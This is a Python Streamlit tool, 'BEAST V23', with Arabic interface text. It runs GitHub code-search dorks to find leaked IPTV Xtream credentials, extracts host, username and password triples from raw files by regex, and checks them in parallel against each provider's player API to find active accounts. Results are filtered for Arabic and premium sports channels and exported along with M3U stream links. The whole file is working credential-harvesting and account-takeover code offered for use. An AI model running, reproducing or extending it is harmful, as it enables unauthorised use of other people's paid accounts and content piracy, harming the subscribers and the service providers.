import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures
import time

# =================================================
# 1. إعدادات الواجهة (تصميم احترافي بدون أخطاء)
# =================================================
st.set_page_config(page_title="BEAST V23 ULTIMATE", layout="wide", page_icon="☣️")

# ستايل لعزل الـ HTML ومنع الأخطاء البصرية التي ظهرت في الصور
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');
    .stApp { background-color: #050505; color: #e0e0e0; }
    .main-title { background: linear-gradient(90deg, #00ff41, #005a17); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 45px; text-align: center; font-weight: bold; padding: 20px; font-family: 'Roboto Mono', monospace; }
    .card {
        background: #111; border: 1px solid #222; border-left: 6px solid #00ff41;
        border-radius: 8px; padding: 15px; margin-bottom: 15px; position: relative;
    }
    .card-host { color: #00ff41; font-weight: bold; font-size: 18px; margin-bottom: 8px; display: block; overflow: hidden; text-overflow: ellipsis; }
    .card-info { font-size: 14px; color: #bbb; line-height: 1.6; }
    .badge-ar { background: #ff4b4b; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; position: absolute; top: 10px; right: 10px; }
    .badge-ch { background: #0084ff; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; position: absolute; top: 35px; right: 10px; }
    .m3u-box { background: #000; padding: 10px; border-radius: 5px; color: #00ff41; font-size: 11px; margin-top: 10px; border: 1px dashed #333; overflow-x: auto; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'seen' not in st.session_state: st.session_state.seen = set()

# =================================================
# 2. محرك الفحص والتحقق من القنوات (The Core)
# =================================================

def verify_account(host, user, pw, targets):
    unique_id = f"{host}{user}"
    if unique_id in st.session_state.seen: return None
    st.session_state.seen.add(unique_id)
    
    try:
        # فحص الحساب الأساسي
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=4).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # جلب الفئات للبحث عن القنوات المطلوبة والمحتوى العربي
            cat_url = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
            cats_text = requests.get(cat_url, timeout=3).text.upper()
            
            # فحص المحتوى العربي
            is_ar = any(k in cats_text for k in ["ARABIC", "NILESAT", "MYHD", "EGYPT", "MAGHREB"])
            
            # فحص القنوات المحددة
            found_targets = []
            if targets:
                target_list = [t.strip().upper() for t in targets.split(',')]
                for t in target_list:
                    if t in cats_text: found_targets.append(t)
                # إذا طلب قنوات معينة ولم يجدها، يتم استبعاد السيرفر
                if not found_targets: return None

            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
                "ar": is_ar, "found_ch": found_targets,
                "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 3. لوحة التحكم الجانبية (Sidebar)
# =================================================
with st.sidebar:
    st.markdown("<h1 style='color:#00ff41;'>🌪️ BEAST V23</h1>", unsafe_allow_html=True)
    token = st.text_input("GitHub Token:", type="password")
    
    st.divider()
    target_channels = st.text_input("بحث عن قنوات محددة:", placeholder="مثال: BEIN, SSC, OSN", help="افصل بين القنوات بفاصلة")
    filter_arabic = st.checkbox("عرض المحتوى العربي فقط 🦅", value=True)
    
    pages_count = st.slider("عمق البحث (عدد الصفحات):", 1, 30, 10)
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 ابدأ الهجوم"): st.session_state.is_hunting = True
    with col2:
        if st.button("🛑 توقف"): st.session_state.is_hunting = False

    st.divider()
    st.metric("🔍 فحص", st.session_state.checked_count)
    st.metric("💎 صيد", len(st.session_state.results))
    
    if st.session_state.results:
        data_txt = "\n".join([f"HOST: {i['host']} | USER: {i['user']} | PASS: {i['pass']} | AR: {i['ar']} | CH: {i['found_ch']}" for i in st.session_state.results])
        st.download_button("📥 تحميل النتائج", data_txt, f"Beast_V23_{datetime.now().strftime('%H-%M')}.txt")

st.markdown("<div class='main-title'>BEAST ULTIMATE V23</div>", unsafe_allow_html=True)

# =================================================
# 4. الرادار وعرض النتائج (The Feed)
# =================================================
display_container = st.empty()

def update_display():
    with display_container.container():
        data = st.session_state.results
        if filter_arabic: data = [i for i in data if i['ar']]
        
        # عرض النتائج في شبكة (2 كروت في كل صف للوضوح)
        for i in range(0, len(data), 2):
            cols = st.columns(2)
            for idx, item in enumerate(data[i:i+2]):
                with cols[idx]:
                    ar_badge = '<span class="badge-ar">ARABIC ✅</span>' if item['ar'] else ''
                    ch_badge = f'<span class="badge-ch">{", ".join(item["found_ch"])}</span>' if item['found_ch'] else ''
                    st.markdown(f"""
                    <div class="card">
                        {ar_badge}
                        {ch_badge}
                        <span class="card-host">{item['host']}</span>
                        <div class="card-info">
                            👤 <b>User:</b> {item['user']} | 🔑 <b>Pass:</b> {item['pass']}<br>
                            📅 <b>Exp:</b> {item['exp']} | 👥 <b>Conn:</b> {item['conn']}
                        </div>
                        <div class="m3u-box">{item['m3u']}</div>
                    </div>
                    """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    if not token:
        st.error("⚠️ يرجى إدخال GitHub Token!")
        st.session_state.is_hunting = False
    else:
        headers = {'Authorization': f'token {token}'}
        # مصفوفة دوركات ضخمة (Massive Dorks List)
        dorks = [
            '"player_api.php" SSC BEIN ARABIC',
            '"get.php?username=" password "SHAHID"',
            'extension:m3u "http" "OSN"',
            'filename:iptv.txt "ARABIC"',
            'filename:beinsports.txt',
            'filename:nilesat.txt',
            'extension:txt "username" "password" "http" OSN',
            'filename:arab_iptv.txt',
            '"xtream" "username" "password" "exp_date" ARABIC'
        ]

        for dork in dorks:
            if not st.session_state.is_hunting: break
            for page in range(1, pages_count + 1):
                if not st.session_state.is_hunting: break
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    r = requests.get(search_url, headers=headers).json()
                    
                    if 'items' in r:
                        for item in r['items']:
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=3).text
                            # استخراج الروابط
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            # فحص متوازٍ فائق السرعة
                            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                                results = list(executor.map(lambda p: verify_account(*p, target_channels), matches))
                                for found in results:
                                    st.session_state.checked_count += 1
                                    if found:
                                        st.session_state.results.insert(0, found)
                                        update_display()
                                        st.toast(f"🎯 صيد ثمين من {found['host']}")
                    elif 'message' in r: # Rate limit check
                        st.warning("⚠️ GitHub Rate Limit.. سأنتظر 30 ثانية.")
                        time.sleep(30)
                        break
                except: continue
        st.session_state.is_hunting = False
        st.success("✅ انتهى الهجوم الشامل.")
else:
    update_display()
